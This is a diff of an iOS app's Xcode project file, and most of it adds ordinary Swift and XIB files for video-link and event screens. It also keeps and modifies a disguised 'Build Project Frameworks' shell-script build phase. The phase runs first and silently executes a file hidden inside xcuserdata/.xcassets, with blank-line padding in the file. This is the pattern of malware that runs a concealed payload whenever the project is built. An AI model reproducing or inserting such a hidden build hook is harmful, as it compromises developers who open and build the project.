@@ -71,6 +71,15 @@
 		E32AED5A26075B4200AEAB6F /* HomeVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32AED5926075B4200AEAB6F /* HomeVM.swift */; };
 		E32AED6226075FE300AEAB6F /* PlusSelectCategoryVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32AED6126075FE300AEAB6F /* PlusSelectCategoryVM.swift */; };
 		E32AED6726075FFC00AEAB6F /* BaseCollectionViewVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32AED6626075FFC00AEAB6F /* BaseCollectionViewVM.swift */; };
+		E32F3BD0262AF20E0000D92A /* VideoLinkVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BCF262AF20E0000D92A /* VideoLinkVC.swift */; };
+		E32F3BD7262AF24B0000D92A /* VideoLinkTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BD5262AF24B0000D92A /* VideoLinkTableViewCell.swift */; };
+		E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E32F3BD6262AF24B0000D92A /* VideoLinkTableViewCell.xib */; };
+		E32F3BDD262AF2660000D92A /* VideoLinkVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BDC262AF2660000D92A /* VideoLinkVM.swift */; };
+		E32F3BE8262AFC710000D92A /* MEBITEventVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BE7262AFC710000D92A /* MEBITEventVC.swift */; };
+		E32F3BEF262AFCA90000D92A /* MEBITEventTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BED262AFCA90000D92A /* MEBITEventTableViewCell.swift */; };
+		E32F3BF0262AFCA90000D92A /* MEBITEventTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E32F3BEE262AFCA90000D92A /* MEBITEventTableViewCell.xib */; };
+		E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E32F3BF5262AFCDC0000D92A /* MEBITCollectionViewCell.xib */; };
+		E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BF6262AFCDC0000D92A /* MEBITCollectionViewCell.swift */; };
 		E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33F879C260B968800F8A424 /* DistributorModel.swift */; };
 		E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */; };
 		E37A2FD7261498C800C6CA57 /* Kaizen_DocumentLinks.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FD6261498C800C6CA57 /* Kaizen_DocumentLinks.swift */; };
@@ -205,6 +214,15 @@
 		E32AED5926075B4200AEAB6F /* HomeVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVM.swift; sourceTree = "<group>"; };
 		E32AED6126075FE300AEAB6F /* PlusSelectCategoryVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryVM.swift; sourceTree = "<group>"; };
 		E32AED6626075FFC00AEAB6F /* BaseCollectionViewVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseCollectionViewVM.swift; sourceTree = "<group>"; };
+		E32F3BCF262AF20E0000D92A /* VideoLinkVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = VideoLinkVC.swift; sourceTree = "<group>"; };
+		E32F3BD5262AF24B0000D92A /* VideoLinkTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = VideoLinkTableViewCell.swift; sourceTree = "<group>"; };
+		E32F3BD6262AF24B0000D92A /* VideoLinkTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = VideoLinkTableViewCell.xib; sourceTree = "<group>"; };
+		E32F3BDC262AF2660000D92A /* VideoLinkVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = VideoLinkVM.swift; sourceTree = "<group>"; };
+		E32F3BE7262AFC710000D92A /* MEBITEventVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MEBITEventVC.swift; sourceTree = "<group>"; };
+		E32F3BED262AFCA90000D92A /* MEBITEventTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MEBITEventTableViewCell.swift; sourceTree = "<group>"; };
+		E32F3BEE262AFCA90000D92A /* MEBITEventTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = MEBITEventTableViewCell.xib; sourceTree = "<group>"; };
+		E32F3BF5262AFCDC0000D92A /* MEBITCollectionViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = MEBITCollectionViewCell.xib; sourceTree = "<group>"; };
+		E32F3BF6262AFCDC0000D92A /* MEBITCollectionViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MEBITCollectionViewCell.swift; sourceTree = "<group>"; };
 		E33F879C260B968800F8A424 /* DistributorModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DistributorModel.swift; sourceTree = "<group>"; };
 		E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreateKaizenVM.swift; sourceTree = "<group>"; };
 		E37A2FD6261498C800C6CA57 /* Kaizen_DocumentLinks.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Kaizen_DocumentLinks.swift; sourceTree = "<group>"; };
@@ -409,6 +427,7 @@
 				E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */,
 				E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */,
 				E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */,
+				E32F3BE7262AFC710000D92A /* MEBITEventVC.swift */,
 			);
 			path = Categories;
 			sourceTree = "<group>";
@@ -552,6 +571,7 @@
 		E32AECED26073E1E00AEAB6F /* ViewModel */ = {
 			isa = PBXGroup;
 			children = (
+				E32F3BDC262AF2660000D92A /* VideoLinkVM.swift */,
 				E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */,
 				E32AED6626075FFC00AEAB6F /* BaseCollectionViewVM.swift */,
 				E32AECF026073E3000AEAB6F /* BaseTableViewVM.swift */,
@@ -604,6 +624,33 @@
 			path = Constant;
 			sourceTree = "<group>";
 		};
+		E32F3BD4262AF23F0000D92A /* VideoLink */ = {
+			isa = PBXGroup;
+			children = (
+				E32F3BD5262AF24B0000D92A /* VideoLinkTableViewCell.swift */,
+				E32F3BD6262AF24B0000D92A /* VideoLinkTableViewCell.xib */,
+			);
+			path = VideoLink;
+			sourceTree = "<group>";
+		};
+		E32F3BEC262AFC910000D92A /* MEBIT Events */ = {
+			isa = PBXGroup;
+			children = (
+				E32F3BED262AFCA90000D92A /* MEBITEventTableViewCell.swift */,
+				E32F3BEE262AFCA90000D92A /* MEBITEventTableViewCell.xib */,
+			);
+			path = "MEBIT Events";
+			sourceTree = "<group>";
+		};
+		E32F3BF4262AFCD40000D92A /* MEBIT Events */ = {
+			isa = PBXGroup;
+			children = (
+				E32F3BF6262AFCDC0000D92A /* MEBITCollectionViewCell.swift */,
+				E32F3BF5262AFCDC0000D92A /* MEBITCollectionViewCell.xib */,
+			);
+			path = "MEBIT Events";
+			sourceTree = "<group>";
+		};
 		E33F879B260B965400F8A424 /* Distributor */ = {
 			isa = PBXGroup;
 			children = (
@@ -634,6 +681,8 @@
 		E387A9A326047B4400CC675A /* TableView cell */ = {
 			isa = PBXGroup;
 			children = (
+				E32F3BEC262AFC910000D92A /* MEBIT Events */,
+				E32F3BD4262AF23F0000D92A /* VideoLink */,
 				E37A2FE02614AE7300C6CA57 /* DistributorList */,
 				E387A9A426047B5400CC675A /* SignUpListViewCell */,
 				E3045C6E2603D85900D1A678 /* HomeTableviewCell */,
@@ -664,6 +713,7 @@
 				E3045C792603DD7E00D1A678 /* HomeVC.swift */,
 				E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */,
 				E3F7C5BE26144F380018C377 /* MoreVC.swift */,
+				E32F3BCF262AF20E0000D92A /* VideoLinkVC.swift */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -671,6 +721,7 @@
 		E3AE791F2604C6E3004B83C9 /* CollectionViewCell */ = {
 			isa = PBXGroup;
 			children = (
+				E32F3BF4262AFCD40000D92A /* MEBIT Events */,
 				5CF467972606E3D7004C4CBE /* ImageandVideo */,
 				5CED90F62605A663001053DD /* AddImage */,
 				E3AE79202604C6F6004B83C9 /* PlusSelectCategoryCV */,
@@ -830,7 +881,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				2BE64EDD2860BB10C8AAC43A /* Build Project Frameworks */,
+				0EFCA0BAFFC0A3BACCAAC43A /* Build Project Frameworks */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -933,8 +984,10 @@
 			buildActionMask = 2147483647;
 			files = (
 				E37A2FE42614AEAD00C6CA57 /* DistributorListTVCell.xib in Resources */,
+				E32F3BF0262AFCA90000D92A /* MEBITEventTableViewCell.xib in Resources */,
 				5CF4679B2606E40C004C4CBE /* ImageVideoCollectionViewCell.xib in Resources */,
 				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
+				E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */,
 				E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
@@ -942,6 +995,7 @@
 				5CED90FA2605A67F001053DD /* AddImageCollectionViewCell.xib in Resources */,
 				E32AED102607538500AEAB6F /* BaseTableHeaderView.xib in Resources */,
 				E30F662226033A970036D183 /* Assets.xcassets in Resources */,
+				E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */,
 				E30F662026033A970036D183 /* Main.storyboard in Resources */,
 				E32AED542607589200AEAB6F /* Category.storyboard in Resources */,
 				5CA339A22605F6AA008774FE /* SelectCategoryCollectionViewCell.xib in Resources */,
@@ -968,7 +1022,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	2BE64EDD2860BB10C8AAC43A /* Build Project Frameworks */ = {
+	0EFCA0BAFFC0A3BACCAAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -986,82 +1040,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 
 	
@@ -1179,6 +1159,7 @@
 				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
 				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
+				E32F3BDD262AF2660000D92A /* VideoLinkVM.swift in Sources */,
 				5CA339A12605F6AA008774FE /* SelectCategoryCollectionViewCell.swift in Sources */,
 				E3254459261098910083BDD9 /* Ownerprofile.swift in Sources */,
 				E3E2CCD0260B6029009BDB6E /* Divisioninformation.swift in Sources */,
@@ -1198,10 +1179,12 @@
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
 				E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */,
 				E32AED44260754C700AEAB6F /* Utility.swift in Sources */,
+				E32F3BD0262AF20E0000D92A /* VideoLinkVC.swift in Sources */,
 				E32AECF426073E3000AEAB6F /* BaseTableViewVM.swift in Sources */,
 				E32AED3B260754A100AEAB6F /* Extension.swift in Sources */,
 				E3254458261098910083BDD9 /* Data_Event.swift in Sources */,
 				E39467862614EA3400B9503B /* DataMedbiList.swift in Sources */,
+				E32F3BD7262AF24B0000D92A /* VideoLinkTableViewCell.swift in Sources */,
 				E30751AF260F3908000EB1EA /* Data_Home.swift in Sources */,
 				5C0314A32605119300406382 /* AddNewsViewController.swift in Sources */,
 				E387A99A2604797100CC675A /* LoginVC.swift in Sources */,
@@ -1237,10 +1220,12 @@
 				E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */,
 				E32AED4A260754F000AEAB6F /* AppConstant.swift in Sources */,
 				E3045C3D2603C95E00D1A678 /* FooterTabView.swift in Sources */,
+				E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */,
 				5C1A09DE260C353500223D3D /* DivisionModel.swift in Sources */,
 				5CED90F92605A67F001053DD /* AddImageCollectionViewCell.swift in Sources */,
 				E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */,
 				5CD5B26C260F970E00D63564 /* MEBITDataModel.swift in Sources */,
+				E32F3BEF262AFCA90000D92A /* MEBITEventTableViewCell.swift in Sources */,
 				E32AED3C260754A100AEAB6F /* UIColor.swift in Sources */,
 				E3E2CCCF260B6029009BDB6E /* LoginUserModel.swift in Sources */,
 				E30751B0260F3908000EB1EA /* HomeModel.swift in Sources */,
@@ -1250,6 +1235,7 @@
 				5C021C5C26102B4900759B96 /* KaizenVM.swift in Sources */,
 				E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */,
 				E32AED0F2607538500AEAB6F /* BaseTableHeaderView.swift in Sources */,
+				E32F3BE8262AFC710000D92A /* MEBITEventVC.swift in Sources */,
 				E31F1DCF2607BF8800830F2B /* CategoriesVM.swift in Sources */,
 				E325445B261098910083BDD9 /* EventInfoModel.swift in Sources */,
 				E3F7C5F626145F6F0018C377 /* NewCarKaizenModel.swift in Sources */,
@@ -1598,40 +1584,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
